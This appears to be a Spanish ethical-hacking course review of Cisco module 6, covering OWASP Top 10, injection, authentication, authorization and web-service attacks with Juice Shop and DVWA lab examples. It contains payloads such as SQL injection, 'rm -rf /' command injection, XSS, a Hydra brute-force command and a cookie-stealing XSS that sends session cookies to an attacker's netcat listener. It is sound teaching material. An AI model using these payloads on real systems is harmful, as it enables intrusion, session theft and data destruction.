# 🛡️ Repaso de Hacker Ético - Cisco Tema 6

Este documento contiene el resumen detallado y los recursos visuales (mapas mentales) generados durante la sesión de repaso del **Tema 6: Explotación de Vulnerabilidades Basadas en Aplicaciones**.

---

## 🗺️ Mapa Mental General del Módulo
![Mapa Mental Módulo 6](./assets/img/mindmap_ethical_hacker_ch6.png)

---

## 📋 6.1: Descripción General y OWASP Top 10

El **OWASP Top 10** es el estándar global sobre los riesgos de seguridad más críticos en aplicaciones web. Es fundamental para priorizar esfuerzos de defensa y hacking ético.

### 🗺️ Mapa Mental: OWASP Top 10
![OWASP Top 10](./assets/img/mindmap_owasp_top10_espanol.png)

### Puntos Clave:
1.  **A01: Control de Acceso Roto (Broken Access Control):** 
    *   **Concepto:** Los usuarios pueden acceder a recursos o realizar acciones fuera de sus permisos previstos.
    *   **Ejemplo:** Cambiar un ID en la URL (`/user/100` -> `/user/101`) para ver datos de otro perfil sin autorización.
2.  **A02: Fallos Criptográficos (Cryptographic Failures):** 
    *   **Concepto:** Exposición de datos sensibles (passwords, tarjetas) por falta de cifrado o uso de algoritmos obsoletos (MD5, SHA-1).
    *   **Ejemplo:** Almacenar contraseñas en texto plano o transmitir datos críticos por HTTP.
3.  **A03: Inyección (Injection):** 
    *   **Concepto:** Envío de datos no confiables a un intérprete que los ejecuta como comandos o consultas.
    *   **Ejemplo:** SQL Injection (`' or 1=1--`) para saltarse el login o inyección de comandos de consola.
4.  **A04: Diseño Inseguro (Insecure Design):** 
    *   **Concepto:** Fallos que vienen de la propia arquitectura y diseño del software, más que de un error de código puntual.
    *   **Ejemplo:** Un proceso de compra que permite saltarse la pasarela de pago modificando el flujo del cliente.
5.  **A05: Configuración Incorrecta (Security Misconfiguration):** 
    *   **Concepto:** Ajustes de seguridad mal aplicados, como permisos por defecto, headers faltantes o funciones innecesarias activas.
    *   **Ejemplo:** Mantener las credenciales `admin/admin` o dejar el listado de directorios (Directory Listing) habilitado.
6.  **A06: Componentes Vulnerables y Obsoletos:** 
    *   **Concepto:** Uso de librerías, frameworks o plugins con vulnerabilidades conocidas que no han sido parcheadas.
    *   **Ejemplo:** Usar una versión antigua de WordPress o librerías de JS con exploits ya publicados.
7.  **A07: Fallos de Identificación y Autenticación:** 
    *   **Concepto:** Debilidades en el manejo de sesiones, contraseñas débiles y falta de MFA.
    *   **Ejemplo:** Permitir ataques de fuerza bruta sin bloqueo de cuenta o no invalidar el token de sesión tras el logout.
8.  **A08: Fallos en Integridad de Software y Datos:** 
    *   **Concepto:** No verificar la integridad de actualizaciones, datos críticos o pipelines de CI/CD.
    *   **Ejemplo:** Descargar una actualización de plugin por un canal no cifrado y sin firma digital.
9.  **A09: Fallos de Registro y Supervisión (Logging & Monitoring):** 
    *   **Concepto:** La incapacidad de detectar, escalar y responder a ataques activos por falta de logs o monitorización.
    *   **Ejemplo:** Un ataque de fuerza bruta que dura horas y nadie lo detecta porque no se registran los errores de login.
10. **A10: SSRF (Server-Side Request Forgery):** 
    *   **Concepto:** El servidor es engañado para realizar peticiones a recursos internos o externos no autorizados.
    *   **Ejemplo:** Usar una función de "importar imagen" para escanear puertos internos de la red de la empresa desde el servidor web.

### 🛠️ Ejemplo Práctico de Laboratorio (Juice Shop)
En nuestras sesiones prácticas, utilizamos **OWASP Juice Shop** para identificar estas vulnerabilidades (ver detalle en [Laboratorio-Pentesting-01.md](./labs/Laboratorio-Pentesting-01.md)):
*   **VULN-05 (Security Misconfiguration):** Acceso al Scoreboard oculto mediante navegación directa (`/#/score-board`).
*   **VULN-06 (Improper Error Handling):** Generación de *Stack Traces* al solicitar archivos inexistentes en `/ftp`, revelando que el servidor usa `Express ^4.21.0`.

---

## 🧠 6.3: Fallas de la Lógica Empresarial (CWE-840)

Estas vulnerabilidades ocurren cuando los flujos legítimos de la aplicación se usan para fines maliciosos debido a un diseño defectuoso.

### 🗺️ Mapa Mental: Lógica Empresarial
![Lógica de Negocio](./assets/img/mindmap_logica_negocio_espanol.png)

### Resumen Técnico:
1.  **Naturaleza de la Lógica de Negocio:**
    *   **Concepto:** Vulnerabilidades que no nacen de errores de código técnicos, sino de fallos en el diseño de los procesos y funciones de la aplicación.
    *   **Ejemplo:** Un sistema de recompensas que permite canjear el mismo código infinitas veces porque el servidor no marca el cupón como "usado" hasta el final del proceso.
2.  **Propiedad no Verificada:**
    *   **Concepto:** El servidor confía en que el usuario solo pedirá datos que le pertenecen.
    *   **Ejemplo:** Un usuario cambia su propio ID en la URL para ver el perfil de otro usuario sin que el sistema verifique la relación de propiedad.
3.  **Salto de Flujo (Step Skipping):**
    *   **Concepto:** Saltarse pasos obligatorios en una secuencia lógica (como una pasarela de pago).
    *   **Ejemplo:** Navegar directamente a `confirmacion_pedido.php` sin haber pasado por el pago, logrando que el sistema procese el envío.
4.  **Falta de Límites y Agotamiento:**
    *   **Concepto:** No imponer restricciones sobre cuántas veces o con qué frecuencia se puede realizar una acción.
    *   *Ejemplo:** Permitir que un script añada 1 millón de productos al carrito, agotando el stock virtual y bloqueando a otros compradores.

### 🏛️ Ejemplo Práctico: Modelado de Amenazas
Para entender cómo prevenir fallos de lógica de negocio, hemos creado un modelo de ejemplo basado en un proceso de compra:
*   **Documento:** [Modelado de Amenazas (STRIDE/DREAD)](./labs/Ejemplo-Modelado-Amenazas.md)
*   **Conceptos Clave:** Suplantación, Manipulación, Repudio, Fuga de información, DoS y Elevación de privilegios.

---

## 💉 6.4: Vulnerabilidades Basadas en Inyección

Ocurren cuando se envían datos no confiables a un intérprete. Es uno de los vectores de ataque más antiguos y peligrosos.

### 🗺️ Mapa Mental: Inyecciones
![Inyección](./assets/img/mindmap_inyeccion_espanol.png)

### Resumen Técnico:

1.  **Inyección SQL (SQLi):**
    *   **Concepto:** Interferencia con las consultas que la aplicación realiza a la base de datos para extraer o manipular información.
    *   **Ejemplo:** Usar `' OR 1=1--` en un campo de texto para engañar al servidor y que devuelva registros de todos los usuarios.
2.  **Inyección de Comandos (OS Command Injection):**
    *   **Concepto:** El atacante logra ejecutar comandos directamente en el sistema operativo del servidor.
    *   **Ejemplo:** En un formulario de "ping", enviar `127.0.0.1; rm -rf /` para intentar borrar archivos del servidor.
3.  **Inyección LDAP:**
    *   **Concepto:** Manipulación de consultas a servicios de directorio para saltar autenticaciones o listar usuarios del dominio.
    *   **Ejemplo:** Inyectar caracteres especiales en un campo de búsqueda de empleados para extraer la estructura interna del Active Directory.

### 🛡️ Defensas Críticas:
- **Consultas Preparadas (Prepared Statements):** Es la defensa #1 contra SQLi.
- **Validación de Entradas:** Solo permitir caracteres esperados (Allow-list).
- **Saneamiento:** Escapar caracteres especiales antes de procesarlos.

### 🛠️ Ejemplo Práctico de Laboratorio (Juice Shop & WebGoat)
*   **SQLi (Bypass de Login):** (Ver detalle en [Laboratorio-Pentesting-01.md](./labs/Laboratorio-Pentesting-01.md))
    *   **Payload:** `' or 1=1--`
    *   **Resultado:** Acceso como administrador sin conocer la contraseña.
*   **XSS Reflejado vs DOM-based:** (Ver detalle en [Laboratorio-Pentesting-02.md](./labs/Laboratorio-Pentesting-02.md))
    *   **Reflejado:** `<img src=x onerror=alert('XSS')>` (Bypass de filtros).
    *   **DOM (Juice Shop):** `/#/search?q=<iframe src="javascript:alert('xss')">` (El payload se procesa en el cliente, no llega al servidor).

---

## 🔐 6.5: Explotando Vulnerabilidades de Autenticación

Los atacantes buscan eludir los mecanismos de control de acceso para suplantar identidades legítimas.

### 🗺️ Mapa Mental: Autenticación
![Autenticación](./assets/img/mindmap_autenticacion_espanol.png)

### 📋 Descripción General (6.5.1)
Los vectores principales incluyen:
1.  **Fuerza Bruta:** 
    *   **Concepto:** Intentos automatizados y masivos para adivinar credenciales probando miles de combinaciones.
    *   **Ejemplo:** Usar un diccionario de contraseñas comunes contra una cuenta de administrador.
2.  **Secuestro de Sesiones (Session Hijacking):** 
    *   **Concepto:** Robo de un token o cookie de sesión activa para suplantar al usuario sin conocer su contraseña.
    *   **Ejemplo:** Capturar la cookie `PHPSESSID` de un usuario en una red pública no cifrada.
3.  **Redireccionamiento Inseguro:** 
    *   **Concepto:** Manipulación de parámetros de URL para enviar al usuario a un sitio malicioso manteniendo la confianza del dominio original.
    *   **Ejemplo:** `?url=http://mi-sitio-phishing.com` en un script de redirección de la empresa.
4.  **Credenciales por Defecto:** 
    *   **Concepto:** Acceso a sistemas utilizando las contraseñas que vienen de fábrica de los fabricantes.
    *   **Ejemplo:** Loguearse en un router de oficina con `admin/admin` porque nadie cambió la clave inicial.
5.  **Ataques a Kerberos:** 
    *   **Concepto:** Explotación del protocolo de autenticación de Windows/Active Directory.
    *   **Ejemplo:** Crear un **Golden Ticket** tras comprometer la cuenta `KRBTGT` para obtener persistencia total en el dominio.

---

### 🍪 6.5.2: Secuestro de Sesión (Session Hijacking)
*   **Concepto:** Una vez que un usuario se autentica, el **ID de Sesión (Cookie/Token)** se convierte en su "llave" de acceso. Si el atacante la roba, no necesita la contraseña.
*   **Ejemplo:** Un atacante intercepta una cookie `session_id=abc123` y la inserta en su propio navegador para suplantar al usuario sin pasar por el login.
*   **Mitigación:** Usar atributos `HttpOnly` (previene robo vía JS) y `Secure` (solo viaja por HTTPS).

---

### ↪️ 6.5.4: Ataques de Redireccionamiento
*   **Concepto (Unvalidated Redirects):** La aplicación redirige a una URL externa basada en un parámetro que el usuario puede controlar.
*   **Ejemplo:** `tienda-oficial.com/redirect?target=http://sitio-malvado.com`. El usuario confía en el dominio inicial pero termina en una web de phishing.
*   **Impacto:** Facilita ataques de Phishing creíbles y robo de credenciales.

---

### 🛠️ 6.5.5: Credenciales Predeterminadas
*   **El eslabón débil:** Routers, switches y cámaras suelen mantener `admin/admin` o similares.
*   **Fuentes de información:**
    *   `defaultpassword.com`: Repositorio de credenciales de fábrica.
    *   **Shodan/Censys:** Motores de búsqueda para localizar estos dispositivos expuestos en Internet.

---

### 🎫 6.5.6: Vulnerabilidades de Kerberos
1.  **Golden Ticket:**
    *   **Concepto:** Ticket de autenticación forjado que otorga acceso total y persistente a un dominio de Windows/AD.
    *   **Ejemplo:** Un atacante que ha comprometido el hash de la cuenta `KRBTGT` puede generar tickets válidos para cualquier usuario durante años.
2.  **Delegación no Restringida:**
    *   **Concepto:** Un servidor tiene permiso para impersonar a cualquier usuario ante cualquier servicio del dominio.
    *   **Ejemplo:** Si un servidor web está comprometido, el atacante puede usar las credenciales de un usuario que se haya logueado para acceder a la base de datos en su nombre.

---

### 🔨 6.5.8: Gestión y Herramientas de Contraseñas
1.  **Tablas Arcoíris (Rainbow Tables):** 
    *   **Concepto:** Bases de datos de hashes precalculados que permiten revertir un hash a texto plano de forma casi instantánea.
    *   **Ejemplo:** Usar **RainbowCrack** para descifrar un hash SHA-1 en segundos comparándolo con una tabla pre-generada.
2.  **Ataque de Diccionario vs Fuerza Bruta:**
    *   **Concepto:** El diccionario prueba palabras reales; la fuerza bruta prueba todas las combinaciones matemáticas posibles.
    *   **Ejemplo:** Probar "admin123" (Diccionario) vs probar cada combinación de 8 caracteres (Fuerza Bruta).

### 🛠️ Ejemplo Práctico de Laboratorio (DVWA & Juice Shop)
*   **Fuerza Bruta (Hydra):** (Ver guion completo en [Guion-Demo-BruteForce.md](./labs/Guion-Demo-BruteForce.md))
    Ataque contra DVWA (Nivel Medio) tras comprobar que la sanitización impide SQLi:
    ```bash
    hydra -l admin -P /tmp/pass.txt -s 80 dvwa-target http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=medium; PHPSESSID=[COOKIE]:F=incorrect"
    ```
*   **Session Hijacking (Robo de Cookies):** (Ver paso a paso en [Laboratorio-Pentesting-01.md](./labs/Laboratorio-Pentesting-01.md#421-robo-de-cookies-session-hijacking))
    1.  **Atacante:** Escucha con netcat: `nc -l -p 8888`
    2.  **Víctima (ejecuta XSS):** `<img src=x onerror="document.location='http://[IP_KALI]:8888/?cookie=' + document.cookie">`
    3.  **Resultado:** El atacante recibe la cookie de sesión en su terminal y puede suplantar al usuario.

---

## 🔐 6.6: Explotando Vulnerabilidades de Autorización

Mientras que la autenticación verifica quién eres, la **autorización** decide qué puedes hacer. Los fallos aquí permiten a los atacantes acceder a datos de otros usuarios o funciones administrativas.

### 🗺️ Mapa Mental: Autorización
![Autorización](./assets/img/mindmap_autorizacion_espanol.png)

### 📋 Conceptos Fundamentales (6.6.1)
1.  **AuthN vs AuthZ:**
    *   **Concepto:** La Autenticación (AuthN) es "quién eres"; la Autorización (AuthZ) es "qué puedes hacer". El fallo ocurre cuando pasas el quién pero no hay control sobre el qué.
    *   **Ejemplo:** Estás logueado como "Usuario Estándar" pero puedes editar el perfil de otro usuario cambiando el ID en el cuerpo de la petición.
2.  **Broken Access Control:**
    *   **Concepto:** Referencia general a cualquier fallo donde se violan los privilegios de acceso.
    *   **Ejemplo:** Un usuario puede descargar el archivo de configuración del servidor (`/admin.config`) simplemente escribiendo la ruta en el navegador.

---

### 🧪 6.6.2: [Contaminación de Parámetros (HPP)](./FAQ_CONCEPTOS.md#7-hpp-http-parameter-pollution)
*   **Concepto:** Consiste en enviar múltiples parámetros con el mismo nombre en una petición (`?user=1&user=2`) para confundir la lógica de procesamiento del servidor.
*   **Ejemplo:** En un sistema de transferencia, enviar `to=cuenta1&to=cuentaAtacante`. Si el banco valida la primera pero envía a la segunda, se ha cometido el fraude.

---

### 🪜 6.6.3: Escalada de Privilegios
1.  **Escalada Horizontal:** 
    *   **Concepto:** Acceso a datos o funciones de otro usuario que tiene el mismo nivel de permisos que nosotros.
    *   **Ejemplo:** Un cliente cambia el ID de factura para descargar y ver la factura de otro cliente.
2.  **Escalada Vertical:** 
    *   **Concepto:** Un usuario con permisos limitados logra realizar acciones reservadas para roles superiores (como Admin).
    *   **Ejemplo:** Modificar un parámetro oculto `is_admin=false` a `true` en una petición para acceder al panel de control.

---

### 🔍 6.6.4: IDOR (Insecure Direct Object Reference)
*   **Concepto:** Ocurre cuando la aplicación muestra identificadores directos a objetos de la base de datos o archivos sin verificar si el usuario tiene permiso sobre ellos.
*   **Ejemplo:** Acceder a `http://tienda.com/descarga/archivo_105.pdf` cuando solo deberíamos tener acceso al `104`.

---

### 🛠️ Ejemplo Práctico de Laboratorio (Juice Shop)
En nuestras sesiones (ver [Laboratorio-Pentesting-01.md](./labs/Laboratorio-Pentesting-01.md)):
*   **Broken Access Control (Directorio FTP):** Acceso a archivos sensibles mediante navegación directa y bypass de filtros con **Null Byte Injection** (`%2500.md`).
*   **Insecure Direct Object Reference:** Aunque no lo documentamos explícitamente como "IDOR", el acceso directo a `/ftp` y archivos del sistema sin control de sesión es un ejemplo claro de falta de control de acceso a objetos.

---

## ⚙️ 6.7: Explotando Vulnerabilidades de Configuración y Componentes

Esta sección se centra en cómo las debilidades en la infraestructura y la falta de mantenimiento de las librerías pueden comprometer una aplicación entera.

### 🗺️ Mapa Mental: Configuración y Componentes
![Configuración y Componentes](./assets/img/mindmap_configuracion_componentes.png)

### Resumen Técnico:

1.  **Security Misconfiguration (Configuración Incorrecta - OWASP A05):**
    *   **Concepto:** Ajustes de seguridad débiles, incompletos o por defecto en el servidor o la aplicación que amplían la superficie de ataque.
    *   **Ejemplo:** Dejar habilitado el **Directory Listing**, permitiendo que un atacante navegue por las carpetas del servidor y encuentre archivos `.bak` o `.env`.
2.  **Cabeceras de Seguridad (Security Headers):**
    *   **Concepto:** Ausencia de directivas HTTP que protegen al usuario frente a ataques de lado del cliente.
    *   **Ejemplo:** No configurar `X-Frame-Options`, lo que permite que el sitio sea víctima de **Clickjacking** (cargar la web en un iframe invisible para engañar al usuario).
3.  **Componentes Vulnerables y Obsoletos (OWASP A06):**
    *   **Concepto:** Uso de bibliotecas (JS, APIs) o frameworks que tienen vulnerabilidades públicas conocidas (CVEs) y no han sido actualizados.
    *   **Ejemplo:** Mantener una versión antigua de **jQuery** que es vulnerable a XSS o ejecución remota de código.
4.  **Credenciales por Defecto y Servicios Innecesarios:**
    *   **Concepto:** Mantener contraseñas de fábrica o servicios activos (FTP, SSH) que no son necesarios para la aplicación web.
    *   **Ejemplo:** Acceder al panel de administración de la base de datos o el CMS usando `admin / admin`.

---

### 🛠️ Ejemplo Práctico de Laboratorio (Juice Shop)
En nuestras sesiones (ver [Laboratorio-Pentesting-01.md](./labs/Laboratorio-Pentesting-01.md)):
*   **VULN-05 (Security Misconfiguration):** El listado de directorios y el acceso al Scoreboard oculto son ejemplos directos de esta categoría.
*   **Información de Versión:** Al provocar un error, el servidor reveló que usaba `Express ^4.21.0`, lo cual es una **fuga de información** típica de configuraciones incorrectas que ayuda al atacante a buscar exploits específicos.

---

## ☁️ 6.8: Explotando Vulnerabilidades de Almacenamiento y Web Services

Las aplicaciones modernas no son monolíticas; dependen de APIs y servicios web para comunicarse. Aquí es donde los atacantes buscan interfaces ocultas o mal protegidas.

### 🗺️ Mapa Mental: Servicios Web (API)
![Servicios Web y Almacenamiento](./assets/img/mindmap_webservices_storage.png)

### 📋 Conceptos Fundamentales (6.8.1)

1.  **Arquitecturas de Servicios Web:**
    *   **SOAP (Simple Object Access Protocol):**
        *   **Estándar:** Basado en XML. Muy estricto.
        *   **Archivo Clave:** `.wsdl` (Web Service Description Language). Es como el mapa del tesoro para un hacker, ya que define todos los métodos y parámetros disponibles.
        *   **Riesgos:** Enumeración de WSDL, Inyección XML (XXE).
    *   **REST (Representational State Transfer):**
        *   **Estándar:** Usa verbos HTTP estándar (GET, POST, PUT, DELETE) y suele hablar en JSON.
        *   **Riesgos:** Falta de autenticación en endpoints ocultos, Mass Assignment (asignación masiva de variables).

2.  **Vulnerabilidades en Almacenamiento del Lado del Cliente:**
    *   **Web Storage (Local & Session Storage):**
        *   **Peligro:** Los datos aquí son accesibles vía JavaScript. **NUNCA** guardar tokens de sesión o datos sensibles aquí si se pueden evitar (vulnerables a XSS).
    *   **Cookies:**
        *   Más seguras *si* se usan los flags `HttpOnly` y `Secure`, pero vulnerables si no se configuran bien.

---

### 🔍 6.8.2: Enumeración de WSDL (SOAP)
*   **Concepto:** Si encontramos la URL del WSDL (ej. `http://victima.com/ws?wsdl`), podemos usar herramientas para generar peticiones válidas automáticas.
*   **Herramientas:** **SoapUI** es el estándar para interactuar y atacar estos servicios.

---

### 🧪 6.8.3: Ataques a APIs REST
1.  **Mass Assignment (Asignación Masiva):**
    *   **Concepto:** Enviar parámetros extra en un JSON que la aplicación no espera pero procesa ciegamente.
    *   **Ejemplo:** En un registro de usuario, enviar `{"user": "mitch", "pass": "123", "role": "admin"}`. Si el backend vuelca el JSON directo al objeto usuario, ¡bam! Eres admin.
2.  **Métodos HTTP Inesperados:**
    *   **Concepto:** Cambiar un `GET /users/1` por `DELETE /users/1` a ver si "suena la flauta" y borra el usuario por falta de controles.

---

## 🏁 Conclusión del Tema 6
Hemos cubierto desde las inyecciones más básicas hasta la lógica de negocio compleja y los servicios web modernos. La clave es siempre:
1.  **Nunca confiar en el cliente** (Input Validation).
2.  **Principio de mínimo privilegio**.
3.  **Defensa en profundidad** (WAF, Hashing, AuthZ estricta).

> **Próximos Pasos:** Preparar el entorno para el Laboratorio Final Integrado.

